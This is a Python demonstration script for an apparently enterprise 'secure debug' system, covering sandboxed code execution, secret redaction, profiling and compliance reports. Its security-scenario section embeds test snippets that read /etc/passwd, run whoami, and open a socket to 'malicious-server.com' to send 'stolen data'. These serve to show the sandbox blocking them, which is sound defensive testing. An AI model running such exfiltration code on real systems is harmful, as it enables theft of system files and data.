"""
ABOV3 Genesis - Secure Debug System Demonstration
Enterprise-grade secure debugging with comprehensive security controls
"""

import asyncio
import logging
from pathlib import Path
from datetime import datetime
import json

# Import the secure debugger
try:
    from abov3.core.secure_debugger import (
        SecureEnterpriseDebugger,
        DebugSecurityLevel,
        get_secure_debugger,
        SECURE_DEBUG_AVAILABLE
    )
    from abov3.security.secure_debug_integration import SecureDebugConfig
except ImportError as e:
    print(f"Import error: {e}")
    print("Please ensure ABOV3 Genesis is properly installed")
    exit(1)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


async def demonstrate_secure_debugging():
    """Comprehensive demonstration of secure debugging capabilities"""
    
    print("="*80)
    print("ABOV3 Genesis - Enterprise Secure Debug System Demo")
    print("="*80)
    
    if not SECURE_DEBUG_AVAILABLE:
        print("WARNING: Security components not available!")
        print("Running in basic mode without enterprise security features.")
    else:
        print("✓ Enterprise security components loaded successfully")
    
    # Project setup
    project_path = Path(__file__).parent.parent
    
    try:
        # Initialize secure debugger
        print("\n1. Initializing Secure Debug System...")
        print("-" * 50)
        
        debugger = await get_secure_debugger(
            project_path=project_path,
            security_level=DebugSecurityLevel.PRODUCTION if SECURE_DEBUG_AVAILABLE else None,
            enable_security=SECURE_DEBUG_AVAILABLE
        )
        
        print("✓ Secure debugger initialized successfully")
        
        # Get security status
        security_status = await debugger.get_security_status()
        print(f"Security Status: {json.dumps(security_status, indent=2)}")
        
        # Create debug session
        print("\n2. Creating Secure Debug Session...")
        print("-" * 50)
        
        session_result = await debugger.create_debug_session(
            user_id="demo_user_001",
            role_id="senior_developer",
            client_ip="192.168.1.100",
            user_agent="ABOV3-SecureDebugDemo/1.0",
            mfa_token="demo_mfa_token_12345"  # In production, this would be real MFA
        )
        
        if not session_result['success']:
            print(f"❌ Failed to create session: {session_result['error']}")
            return
        
        session_id = session_result['session_id']
        session_token = session_result['session_token']
        
        print(f"✓ Debug session created successfully")
        print(f"  Session ID: {session_id}")
        print(f"  Security Enabled: {session_result['security_enabled']}")
        print(f"  Permission Level: {session_result['permission_level']}")
        
        # Demonstrate secure code execution
        print("\n3. Secure Code Execution Examples...")
        print("-" * 50)
        
        # Example 1: Safe code
        print("\nExample 1: Safe Python code")
        safe_code = '''
import math

def calculate_fibonacci(n):
    """Calculate fibonacci number safely"""
    if n <= 1:
        return n
    a, b = 0, 1
    for _ in range(2, n + 1):
        a, b = b, a + b
    return b

result = calculate_fibonacci(10)
print(f"Fibonacci(10) = {result}")
        '''
        
        result1 = await debugger.execute_debug_code(
            session_id=session_id,
            code=safe_code,
            language='python'
        )
        
        print(f"Execution Result: {result1['success']}")
        if result1['success']:
            print(f"Output: {result1['stdout']}")
            print(f"Execution Time: {result1['execution_time']}s")
        else:
            print(f"Error: {result1['error']}")
        
        # Example 2: Code with sensitive data
        print("\nExample 2: Code with sensitive data (will be redacted)")
        sensitive_code = '''
import os

# This contains sensitive information that should be redacted
api_key = "sk-1234567890abcdef1234567890abcdef"
password = "super_secret_password_123"
email = "user@company.com"

print("Configuration loaded")
print(f"API Key: {api_key[:8]}...")
print(f"Email: {email}")

# This would normally be flagged by security
database_url = "postgresql://admin:secret@localhost:5432/production"
        '''
        
        result2 = await debugger.execute_debug_code(
            session_id=session_id,
            code=sensitive_code,
            language='python'
        )
        
        print(f"Execution Result: {result2['success']}")
        if result2['success']:
            print(f"Output: {result2['stdout']}")
            print(f"Security Warnings: {result2.get('security_warnings', [])}")
        
        # Example 3: Potentially dangerous code (should be blocked)
        print("\nExample 3: Potentially dangerous code (should be blocked/sandboxed)")
        dangerous_code = '''
import os
import subprocess

# This would be blocked or heavily sandboxed
try:
    # Attempt file system access
    files = os.listdir('/etc')
    print(f"Found {len(files)} system files")
    
    # Attempt system command
    result = subprocess.run(['whoami'], capture_output=True, text=True)
    print(f"Current user: {result.stdout.strip()}")
    
except Exception as e:
    print(f"Operation blocked: {e}")
        '''
        
        result3 = await debugger.execute_debug_code(
            session_id=session_id,
            code=dangerous_code,
            language='python'
        )
        
        print(f"Execution Result: {result3['success']}")
        if result3['success']:
            print(f"Output: {result3['stdout']}")
            print(f"Security Violations: {result3.get('security_violations', [])}")
        else:
            print(f"Blocked: {result3['error']}")
        
        # Demonstrate profiling
        print("\n4. Secure Code Profiling...")
        print("-" * 50)
        
        profile_code = '''
def bubble_sort(arr):
    """Inefficient sorting for profiling demo"""
    n = len(arr)
    for i in range(n):
        for j in range(0, n - i - 1):
            if arr[j] > arr[j + 1]:
                arr[j], arr[j + 1] = arr[j + 1], arr[j]
    return arr

# Profile this code
import random
data = [random.randint(1, 100) for _ in range(100)]
sorted_data = bubble_sort(data.copy())
print(f"Sorted {len(sorted_data)} elements")
        '''
        
        profile_result = await debugger.profile_code(
            session_id=session_id,
            code=profile_code,
            language='python'
        )
        
        if 'error' not in profile_result:
            print("✓ Code profiling completed")
            print(f"Execution successful: {profile_result['execution_result']['success']}")
            
            performance_report = profile_result.get('performance_report', {})
            if 'summary' in performance_report:
                summary = performance_report['summary']
                print(f"Total function calls: {summary.get('total_function_calls', 0)}")
                print(f"Bottlenecks found: {summary.get('total_bottlenecks', 0)}")
        else:
            print(f"❌ Profiling failed: {profile_result['error']}")
        
        # Demonstrate exception analysis
        print("\n5. Secure Exception Analysis...")
        print("-" * 50)
        
        try:
            # Generate an exception for analysis
            def problematic_function():
                data = {"key1": "value1"}
                return data["nonexistent_key"]  # This will raise KeyError
            
            problematic_function()
            
        except Exception as e:
            exception_analysis = await debugger.debug_exception(session_id, e)
            
            if 'error' not in exception_analysis:
                print("✓ Exception analyzed successfully")
                print(f"Exception type: {exception_analysis['exception_type']}")
                print(f"Suggestions: {exception_analysis['suggestions'][:3]}")  # First 3 suggestions
                
                if 'security_warning' in exception_analysis:
                    print(f"Security Warning: {exception_analysis['security_warning']}")
            else:
                print(f"❌ Exception analysis failed: {exception_analysis['error']}")
        
        # Demonstrate object inspection
        print("\n6. Secure Object Inspection...")
        print("-" * 50)
        
        # Create an object to inspect
        class DemoClass:
            def __init__(self):
                self.public_attr = "public value"
                self._private_attr = "private value"
                self.secret_key = "sk-secret123"  # This would be flagged
                
            def public_method(self):
                return "public method result"
                
            def _private_method(self):
                return "private method result"
        
        demo_obj = DemoClass()
        inspection_result = debugger.inspect_object(session_id, demo_obj)
        
        if 'error' not in inspection_result:
            print("✓ Object inspection completed")
            print(f"Object type: {inspection_result['type']}")
            print(f"Attributes found: {len(inspection_result.get('attributes', {}))}")
            print(f"Methods found: {len(inspection_result.get('methods', []))}")
            
            if 'security' in inspection_result:
                print("✓ Security metadata included in inspection")
        else:
            print(f"❌ Object inspection failed: {inspection_result['error']}")
        
        # Get session status
        print("\n7. Session Status and Security Metrics...")
        print("-" * 50)
        
        session_status = await debugger.get_session_status(session_id)
        if 'error' not in session_status:
            print("✓ Session status retrieved")
            print(f"Session ID: {session_status['session_id']}")
            print(f"User ID: {session_status['user_id']}")
            print(f"Secure Session: {session_status['is_secure']}")
        
        # List all active sessions
        active_sessions = debugger.list_active_sessions()
        print(f"\nActive sessions: {len(active_sessions)}")
        
        # Generate compliance report (if security enabled)
        if SECURE_DEBUG_AVAILABLE:
            print("\n8. Compliance Reporting...")
            print("-" * 50)
            
            compliance_report = await debugger.generate_compliance_report("soc2")
            if compliance_report:
                print("✓ SOC 2 compliance report generated")
                print(f"Report type: {compliance_report['report_type']}")
                print(f"Period: {compliance_report['period']}")
                
                if 'debug_security_metrics' in compliance_report:
                    metrics = compliance_report['debug_security_metrics']
                    print(f"Debug sessions: {metrics['total_debug_sessions']}")
                    print(f"Code executions: {metrics['code_executions']}")
                    print(f"Security violations: {metrics['security_violations']}")
            else:
                print("❌ Compliance report generation failed")
        
        # Demonstrate session termination
        print("\n9. Secure Session Termination...")
        print("-" * 50)
        
        termination_success = await debugger.terminate_session(
            session_id, 
            reason="Demo completed successfully"
        )
        
        if termination_success:
            print("✓ Debug session terminated securely")
        else:
            print("❌ Session termination failed")
        
        print("\n" + "="*80)
        print("Secure Debug System Demo Completed Successfully!")
        print("="*80)
        
        # Show final security status
        final_status = await debugger.get_security_status()
        print(f"\nFinal Security Status:")
        print(f"  Active Sessions: {final_status['active_sessions']}")
        print(f"  Security Enabled: {final_status['security_enabled']}")
        
        if SECURE_DEBUG_AVAILABLE:
            print(f"\nEnterprise Security Features Demonstrated:")
            print(f"  ✓ Role-based access control")
            print(f"  ✓ Multi-factor authentication simulation")
            print(f"  ✓ Sensitive data detection and redaction")
            print(f"  ✓ Sandboxed code execution")
            print(f"  ✓ Comprehensive audit logging")
            print(f"  ✓ Real-time security monitoring")
            print(f"  ✓ Compliance reporting")
            print(f"  ✓ Encrypted data storage")
            print(f"  ✓ Secure session management")
            print(f"  ✓ Threat detection capabilities")
        
    except Exception as e:
        logger.error(f"Demo failed with error: {e}")
        print(f"\n❌ Demo failed: {e}")
    
    finally:
        # Cleanup
        try:
            await debugger.shutdown()
            print("\n✓ Secure debugger shutdown completed")
        except:
            pass


async def demonstrate_security_scenarios():
    """Demonstrate specific security scenarios"""
    
    print("\n" + "="*80)
    print("SECURITY SCENARIO DEMONSTRATIONS")
    print("="*80)
    
    project_path = Path(__file__).parent.parent
    debugger = await get_secure_debugger(project_path)
    
    # Scenario 1: Unauthorized access attempt
    print("\nScenario 1: Unauthorized Access Attempt")
    print("-" * 50)
    
    unauthorized_result = await debugger.create_debug_session(
        user_id="malicious_user",
        role_id="admin",  # Trying to escalate privileges
        client_ip="192.168.999.999",  # Invalid IP
        user_agent="HackerTool/1.0"
    )
    
    if not unauthorized_result['success']:
        print(f"✓ Unauthorized access blocked: {unauthorized_result['error']}")
    else:
        print(f"⚠️  Unauthorized access allowed - check security configuration")
    
    # Scenario 2: Data exfiltration attempt
    print("\nScenario 2: Data Exfiltration Attempt")
    print("-" * 50)
    
    # Create legitimate session first
    legitimate_session = await debugger.create_debug_session(
        user_id="legitimate_user",
        role_id="developer"
    )
    
    if legitimate_session['success']:
        session_id = legitimate_session['session_id']
        
        # Attempt to execute data exfiltration code
        exfiltration_code = '''
import os
import socket

# Attempt to access sensitive files
try:
    with open('/etc/passwd', 'r') as f:
        sensitive_data = f.read()
    print("Accessed sensitive system file")
except Exception as e:
    print(f"File access blocked: {e}")

# Attempt network communication
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('malicious-server.com', 80))
    sock.send(b'stolen data')
    print("Data exfiltrated")
except Exception as e:
    print(f"Network communication blocked: {e}")
        '''
        
        exfil_result = await debugger.execute_debug_code(
            session_id=session_id,
            code=exfiltration_code
        )
        
        if exfil_result['success']:
            print(f"Code executed (sandboxed): {exfil_result['stdout']}")
            if exfil_result.get('security_violations'):
                print(f"✓ Security violations detected: {exfil_result['security_violations']}")
        else:
            print(f"✓ Malicious code execution blocked: {exfil_result['error']}")
        
        await debugger.terminate_session(session_id, "Security scenario complete")
    
    print("\n✓ Security scenarios demonstration complete")


if __name__ == "__main__":
    """Main demo execution"""
    
    print("Starting ABOV3 Genesis Secure Debug System Demo...")
    
    try:
        # Run main demonstration
        asyncio.run(demonstrate_secure_debugging())
        
        # Run security scenarios
        asyncio.run(demonstrate_security_scenarios())
        
    except KeyboardInterrupt:
        print("\n\nDemo interrupted by user")
    except Exception as e:
        print(f"\n\nDemo failed with error: {e}")
        logger.exception("Demo error")
    
    print("\nDemo execution complete.")